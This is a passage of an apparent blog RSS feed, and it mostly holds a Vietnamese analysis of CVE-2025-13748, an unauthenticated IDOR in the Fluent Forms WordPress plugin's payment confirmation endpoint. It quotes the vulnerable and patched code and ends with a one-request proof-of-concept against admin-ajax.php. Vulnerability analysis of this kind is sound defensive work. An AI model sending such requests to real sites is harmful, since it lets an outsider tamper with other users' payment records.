1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/elex-helpdesk-customer-support-ticket-system/vulnerability/wordpress-elex-wordpress-helpdesk-customer-ticketing-system-plugin-3-2-9-authenticated-subscriber-insecure-direct-object-reference-via-eh-crm-ticket-single-view-client-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress ELEX WordPress HelpDesk &amp;amp; Customer Ticketing System Plugin &amp;lt;= 3.2.9 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-13748 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-12-27-cve-2025-13748/</link>
      <pubDate>Sat, 27 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-12-27-cve-2025-13748/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-27-cve-2025-13748/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Fluent Forms – Customizable Contact Forms, Survey, Quiz, &amp;amp; Conversational Form Builder&lt;/strong&gt; tồn tại &lt;strong&gt;lỗ hổng Insecure Direct Object Reference (IDOR)&lt;/strong&gt; trong tất cả các phiên bản &lt;strong&gt;≤ 6.1.7&lt;/strong&gt; thông qua tham số &lt;code&gt;submission_id&lt;/code&gt; trong endpoint xác nhận thanh toán SCA.&#xA;Lỗ hổng cho phép &lt;strong&gt;người dùng chưa xác thực&lt;/strong&gt; có thể &lt;strong&gt;đánh dấu submission của người khác là failed&lt;/strong&gt;, gây gián đoạn quá trình thanh toán.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-13748&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-13748&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 6.1.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 6.1.8&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (6.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/fluentform/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress FluentForm Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;FluentForm&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;6.1.7&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;6.1.8&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đăng ký AJAX handler &lt;strong&gt;cho người chưa đăng nhập&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&amp;#39;wp_ajax_nopriv_fluentform_sca_inline_confirm_payment&amp;#39;, [$this, &amp;#39;confirmScaPayment&amp;#39;]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; là hook dành cho người dùng chưa đăng nhập (kể cả Unauthenticated). Khi có request tới endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; với param &lt;code&gt;action=fluentform_sca_inline_confirm_payment&lt;/code&gt; thì callback &lt;code&gt;confirmScaPayment&lt;/code&gt; được gọi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function confirmScaPayment()&#xA;{&#xA;    // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature&#xA;    $formId = isset($_REQUEST[&amp;#39;form_id&amp;#39;]) ? intval($_REQUEST[&amp;#39;form_id&amp;#39;]) : 0;&#xA;    // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature&#xA;    $submissionId = isset($_REQUEST[&amp;#39;submission_id&amp;#39;]) ? intval($_REQUEST[&amp;#39;submission_id&amp;#39;]) : 0;&#xA;    // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature&#xA;    $paymentMethod = isset($_REQUEST[&amp;#39;payment_method&amp;#39;]) ? sanitize_text_field(wp_unslash($_REQUEST[&amp;#39;payment_method&amp;#39;])) : &amp;#39;&amp;#39;;&#xA;    // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature&#xA;    $paymentIntentId = isset($_REQUEST[&amp;#39;payment_intent_id&amp;#39;]) ? sanitize_text_field(wp_unslash($_REQUEST[&amp;#39;payment_intent_id&amp;#39;])) : &amp;#39;&amp;#39;;&#xA;&#xA;    $this-&amp;gt;setSubmissionId($submissionId);&#xA;    $submission = $this-&amp;gt;getSubmission();&#xA;    $this-&amp;gt;form = $this-&amp;gt;getForm();&#xA;&#xA;    $transaction = $this-&amp;gt;getLastTransaction($submissionId);&#xA;&#xA;    $confirmation = SCA::confirmPayment($paymentIntentId, [&#xA;        &amp;#39;payment_method&amp;#39; =&amp;gt; $paymentMethod&#xA;    ], $formId);&#xA;&#xA;    if (is_wp_error($confirmation)) {&#xA;        $message = &amp;#39;Payment has been failed. &amp;#39; . $confirmation-&amp;gt;get_error_message();&#xA;        $this-&amp;gt;handlePaymentChargeError($message, $submission, $transaction, $confirmation, &amp;#39;payment_error&amp;#39;);&#xA;    }&#xA;&#xA;    if ($confirmation-&amp;gt;status == &amp;#39;succeeded&amp;#39;) {&#xA;        $charge = $confirmation-&amp;gt;charges-&amp;gt;data[0];;&#xA;        $this-&amp;gt;handlePaymentSuccess($charge, $transaction, $submission);&#xA;    } else {&#xA;        $this-&amp;gt;handlePaymentChargeError(&amp;#39;We could not verify your payment. Please try again&amp;#39;, $submission, $transaction, $confirmation, &amp;#39;payment_error&amp;#39;);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong hàm &lt;code&gt;confirmScaPayment()&lt;/code&gt;, plugin lấy &lt;code&gt;submission_id&lt;/code&gt; trực tiếp từ request:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$submissionId = isset($_REQUEST[&amp;#39;submission_id&amp;#39;]) ? intval($_REQUEST[&amp;#39;submission_id&amp;#39;]) : 0;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Giá trị này:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Không được ràng buộc với user hiện tại&lt;/li&gt;&#xA;&lt;li&gt;Không được kiểm tra ownership&lt;/li&gt;&#xA;&lt;li&gt;Không được kiểm tra mối quan hệ với &lt;code&gt;form_id&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Tức là bất kỳ ai gửi request đến endpoint đều có thể chỉ định bất kỳ submission nào tồn tại trong database.&lt;/p&gt;&#xA;&lt;p&gt;Sau khi lấy &lt;code&gt;submission_id&lt;/code&gt;, hệ thống tiếp tục:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;setSubmissionId($submissionId);&#xA;$submission = $this-&amp;gt;getSubmission();&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Ở đây xảy ra điều cốt lõi của IDOR: Object (submission) được truy xuất trực tiếp bằng ID do user kiểm soát, mà không có bất kỳ lớp kiểm soát truy cập nào.&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;Không có bất kỳ logic nào như:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ($submission-&amp;gt;user_id !== get_current_user_id()) {&#xA;    deny_access();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hay:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ($submission-&amp;gt;form_id !== $formId) {&#xA;    deny_access();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Điều này dẫn đến việc: Submission của user A có thể bị thao tác bởi người chưa đăng nhập.&lt;/p&gt;&#xA;&lt;p&gt;Ở bản vá, toàn bộ request phải vượt qua bước xác thực:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-27-cve-2025-13748/patch.png&#34; title=&#34;Bản vá&#34; data-thumbnail=&#34;/posts/2025-12-27-cve-2025-13748/patch.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;Bản vá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-27-cve-2025-13748/patch.png&#39; alt=&#34;Patch&#34; height=&#34;447&#34; width=&#34;1875&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Bản vá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function validateScaRequest($submissionId, $paymentIntentId, $submission = null, $transaction = null)&#xA;{&#xA;    $strictMode = apply_filters(&amp;#39;fluentform/stripe_sca_strict_security&amp;#39;, false);&#xA;    $warnings = [];&#xA;&#xA;    // Validate nonce (optional in non-strict mode for backward compatibility)&#xA;    $nonce = isset($_REQUEST[&amp;#39;_ff_stripe_nonce&amp;#39;]) ? sanitize_text_field(wp_unslash($_REQUEST[&amp;#39;_ff_stripe_nonce&amp;#39;])) : &amp;#39;&amp;#39;;&#xA;    &#xA;    if ($nonce) {&#xA;        $nonceAction = &amp;#39;fluentform_sca_confirm_&amp;#39; . $submissionId;&#xA;        if (!wp_verify_nonce($nonce, $nonceAction)) {&#xA;            $error = __(&amp;#39;Security verification failed. Invalid nonce.&amp;#39;, &amp;#39;fluentform&amp;#39;);&#xA;            if ($strictMode) {&#xA;                return new \WP_Error(&amp;#39;invalid_nonce&amp;#39;, $error);&#xA;            }&#xA;            $warnings[] = &amp;#39;Invalid nonce provided&amp;#39;;&#xA;        }&#xA;    } else {&#xA;        $warning = &amp;#39;No nonce provided for SCA payment confirmation&amp;#39;;&#xA;        if ($strictMode) {&#xA;            return new \WP_Error(&amp;#39;missing_nonce&amp;#39;, __(&amp;#39;Security verification failed. Nonce required.&amp;#39;, &amp;#39;fluentform&amp;#39;));&#xA;        }&#xA;        $warnings[] = $warning;&#xA;    }&#xA;&#xA;    // Validate submission exists&#xA;    if (!$submission || !$submission-&amp;gt;id) {&#xA;        return new \WP_Error(&amp;#39;invalid_submission&amp;#39;, __(&amp;#39;Invalid submission.&amp;#39;, &amp;#39;fluentform&amp;#39;));&#xA;    }&#xA;&#xA;&#xA;    if ($submission-&amp;gt;payment_status === &amp;#39;paid&amp;#39;) {&#xA;        return new \WP_Error(&#xA;            &amp;#39;already_paid&amp;#39;,&#xA;            __(&amp;#39;This payment has already been completed and cannot be modified.&amp;#39;, &amp;#39;fluentform&amp;#39;)&#xA;        );&#xA;    }&#xA;&#xA;    // stores it in transaction.charge_id, and frontend sends it back.&#xA;    // Mismatch only occurs during attack attempts.&#xA;    if ($transaction &amp;amp;&amp;amp; $transaction-&amp;gt;charge_id) {&#xA;        if ($transaction-&amp;gt;charge_id !== $paymentIntentId) {&#xA;            return new \WP_Error(&#xA;                &amp;#39;payment_intent_mismatch&amp;#39;,&#xA;                __(&amp;#39;Payment verification failed. Payment intent does not match.&amp;#39;, &amp;#39;fluentform&amp;#39;)&#xA;            );&#xA;        }&#xA;    }&#xA;&#xA;    // Log warnings for monitoring&#xA;    if (!empty($warnings) &amp;amp;&amp;amp; defined(&amp;#39;WP_DEBUG&amp;#39;) &amp;amp;&amp;amp; WP_DEBUG) {&#xA;        $logData = [&#xA;            &amp;#39;parent_source_id&amp;#39; =&amp;gt; $submission-&amp;gt;form_id,&#xA;            &amp;#39;source_type&amp;#39;      =&amp;gt; &amp;#39;submission_item&amp;#39;,&#xA;            &amp;#39;source_id&amp;#39;        =&amp;gt; $submission-&amp;gt;id,&#xA;            &amp;#39;component&amp;#39;        =&amp;gt; &amp;#39;Payment&amp;#39;,&#xA;            &amp;#39;status&amp;#39;           =&amp;gt; &amp;#39;warning&amp;#39;,&#xA;            &amp;#39;title&amp;#39;            =&amp;gt; __(&amp;#39;Stripe SCA Security Warning&amp;#39;, &amp;#39;fluentform&amp;#39;),&#xA;            &amp;#39;description&amp;#39;      =&amp;gt; implode(&amp;#39;; &amp;#39;, $warnings)&#xA;        ];&#xA;        do_action(&amp;#39;fluentform/log_data&amp;#39;, $logData);&#xA;    }&#xA;&#xA;    return [&#xA;        &amp;#39;valid&amp;#39;    =&amp;gt; true,&#xA;        &amp;#39;warnings&amp;#39; =&amp;gt; $warnings&#xA;    ];&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hàm &lt;code&gt;validateScaRequest&lt;/code&gt; thực hiện:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Kiểm tra &lt;code&gt;submission_id&lt;/code&gt; có tồn tại hợp lệ hay không&lt;/li&gt;&#xA;&lt;li&gt;Ngăn xử lý nếu submission đã được thanh toán&lt;/li&gt;&#xA;&lt;li&gt;Ràng buộc &lt;code&gt;payment_intent_id&lt;/code&gt; với transaction tương ứng&lt;/li&gt;&#xA;&lt;li&gt;Ngăn việc dùng payment intent giả mạo&lt;/li&gt;&#xA;&lt;li&gt;Thêm xác thực nonce cho request&lt;/li&gt;&#xA;&lt;li&gt;Ghi log khi phát hiện hành vi bất thường&lt;/li&gt;&#xA;&lt;li&gt;Chặn hoàn toàn việc thay đổi trạng thái submission trái phép&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Điều này đã kiểm soát chặt logic, khiến lỗi hổng IDOR không thể xảy ra.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Unauthenticated Attacker&amp;#34;] &#xA;--&amp;gt; B[&amp;#34;Send request to admin-ajax.php?action=fluentform_sca_inline_confirm_payment&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Extract submission_id &amp;amp; payment_intent_id from request&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;No nonce validation&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Load submission by submission_id&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;No ownership or relationship check&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Load transaction using submission_id&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;No validation between payment_intent_id and transaction&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;Process payment confirmation&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;Update submission status (success / failed)&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;Attacker manipulates victim&amp;#39;s submission&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Gửi request:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: victim.com&#xA;Content-Type: application/x-www-form-urlencoded&#xA;&#xA;action=fluentform_sca_inline_confirm_payment&#xA;&amp;amp;submission_id=1024&#xA;&amp;amp;payment_method=card&#xA;&amp;amp;payment_intent_id=pi_fake&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng CVE-2025-13748 xuất phát từ việc &lt;strong&gt;tin tưởng dữ liệu đầu vào do client kiểm soát&lt;/strong&gt;, cụ thể là &lt;code&gt;submission_id&lt;/code&gt;, trong khi không có bất kỳ cơ chế kiểm soát quyền sở hữu hoặc xác thực ngữ cảnh nào. Endpoint xác nhận thanh toán được mở cho người chưa đăng nhập và cho phép thao tác trực tiếp lên submission mà không ràng buộc với user, form hay transaction hợp lệ.&lt;/p&gt;&#xA;&lt;p&gt;Việc thiếu kiểm tra ownership, thiếu ràng buộc giữa &lt;code&gt;payment_intent_id&lt;/code&gt; và transaction, cùng với việc không xác thực nguồn request đã tạo điều kiện cho kẻ tấn công &lt;strong&gt;thao túng trạng thái thanh toán của người khác&lt;/strong&gt;. Đây là một trường hợp điển hình của &lt;strong&gt;Insecure Direct Object Reference (IDOR)&lt;/strong&gt; phát sinh từ lỗi thiết kế logic nghiệp vụ, không phải lỗi kỹ thuật đơn lẻ.&lt;/p&gt;&#xA;&lt;p&gt;Bản vá đã khắc phục triệt để bằng cách bổ sung nhiều lớp kiểm soát, xác thực và ràng buộc dữ liệu, từ đó loại bỏ hoàn toàn khả năng khai thác.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Không bao giờ tin dữ liệu do client cung cấp, kể cả trong các luồng nội bộ như thanh 